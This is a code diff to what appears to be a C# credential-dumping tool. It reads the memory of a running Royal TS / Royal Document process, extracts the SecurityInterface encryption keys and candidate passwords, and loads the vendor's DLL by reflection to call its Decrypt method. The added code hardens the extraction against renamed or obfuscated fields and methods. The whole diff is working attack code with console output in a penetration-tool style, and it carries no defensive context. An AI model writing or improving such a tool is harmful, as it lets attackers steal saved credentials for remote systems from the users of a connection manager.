@@ -655,21 +655,44 @@ class Program
                 if (!obj.IsValid || obj.Type == null) continue;
                 var tn1 = obj.Type.Name ?? "";
 
-                if (tn1 == "RoyalDocumentLibrary.RoyalSecurityInterface")
+                if (tn1.Contains("RoyalSecurityInterface") || tn1 == "RoyalDocumentLibrary.RoyalStore")
                 {
-                    try {
-                        var f1 = obj.ReadStringField("smhos"); if (!string.IsNullOrEmpty(f1)) siKey1 = f1;
-                    } catch {}
-                    try {
-                        var f2 = obj.ReadStringField("smhot"); if (!string.IsNullOrEmpty(f2)) siKey2 = f2;
-                    } catch {}
-                    try {
-                        var f3 = obj.ReadStringField("smhou"); if (!string.IsNullOrEmpty(f3)) siDoc = f3;
-                    } catch {}
+                    var targets = new List<ClrObject>();
+                    if (tn1.Contains("RoyalSecurityInterface"))
+                    {
+                        targets.Add(obj);
+                    }
+                    else
+                    {
+                        try { var si = obj.ReadObjectField("<SecurityInterface>k__BackingField"); if (si.IsValid && si.Type != null) targets.Add(si); } catch {}
+                        try { var si = obj.ReadObjectField("<SecurityInterfaceLegacy>k__BackingField"); if (si.IsValid && si.Type != null) targets.Add(si); } catch {}
+                    }
+                    foreach (var si in targets)
+                    {
+                        if (!string.IsNullOrEmpty(siKey1)) break;
+                        try { var v = si.ReadStringField("smhos"); if (!string.IsNullOrEmpty(v)) siKey1 = v; } catch {}
+                        try { var v = si.ReadStringField("smhot"); if (!string.IsNullOrEmpty(v)) siKey2 = v; } catch {}
+                        try { var v = si.ReadStringField("smhou"); if (!string.IsNullOrEmpty(v)) siDoc = v; } catch {}
+                        if (string.IsNullOrEmpty(siKey1))
+                        {
+                            var strFields = new List<(string name, string val)>();
+                            foreach (var f in si.Type.Fields)
+                            {
+                                if (f.ElementType != ClrElementType.String) continue;
+                                try { var v = si.ReadStringField(f.Name); if (!string.IsNullOrEmpty(v)) strFields.Add((f.Name, v)); } catch {}
+                            }
+                            var keys = strFields.Where(x => x.val.Length == 50).ToList();
+                            var doc = strFields.FirstOrDefault(x => x.val.EndsWith(".rtsz") || x.val.EndsWith(".rtsx") || x.val == "Application");
+                            if (keys.Count >= 2)
+                            {
+                                siKey1 = keys[0].val; siKey2 = keys[1].val; siDoc = doc.val ?? "";
+                                Console.WriteLine($"[*] SecurityInterface keys detected by pattern (fields: {keys[0].name}, {keys[1].name})");
+                            }
+                        }
+                    }
                     continue;
                 }
 
-                // Collect Zxcvbn passwords as document password candidates
                 if (tn1 == "Zxcvbn.Result")
                 {
                     foreach (var f in obj.Type.Fields)
@@ -761,10 +784,23 @@ class Program
                 var siAsm = Assembly.LoadFrom(Path.Combine(rtDir, "RoyalDocument.SecurityInterface.dll"));
                 var siType = siAsm.GetType("RoyalDocumentLibrary.RoyalSecurityInterface")!;
                 siInst = Activator.CreateInstance(siType);
-                siType.GetField("smhos", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siKey1);
-                siType.GetField("smhot", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siKey2);
-                siType.GetField("smhou", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance)!.SetValue(siInst, siDoc);
+                var bf = BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance;
+                var fKey1 = siType.GetField("smhos", bf);
+                var fKey2 = siType.GetField("smhot", bf);
+                var fDoc = siType.GetField("smhou", bf);
+                if (fKey1 == null || fKey2 == null) {
+                    var strFields = siType.GetFields(bf).Where(f => f.FieldType == typeof(string)).ToList();
+                    if (strFields.Count >= 3) { fKey1 = strFields[0]; fKey2 = strFields[1]; fDoc = strFields[2]; }
+                }
+                fKey1?.SetValue(siInst, siKey1); fKey2?.SetValue(siInst, siKey2); fDoc?.SetValue(siInst, siDoc);
                 decMethod = siType.GetMethod("Decrypt", new[] { typeof(string), typeof(bool), typeof(string) });
+                if (decMethod == null) {
+                    foreach (var m in siType.GetMethods(bf)) {
+                        var pars = m.GetParameters();
+                        if (pars.Length == 3 && pars[0].ParameterType == typeof(string) && pars[1].ParameterType == typeof(bool) && pars[2].ParameterType == typeof(string) && m.ReturnType == typeof(string))
+                        { decMethod = m; break; }
+                    }
+                }
                 Console.WriteLine("[*] SecurityInterface loaded, decrypting...");
             } catch (Exception ex) {
                 Console.WriteLine($"[!] Failed to load SecurityInterface: {ex.Message}");
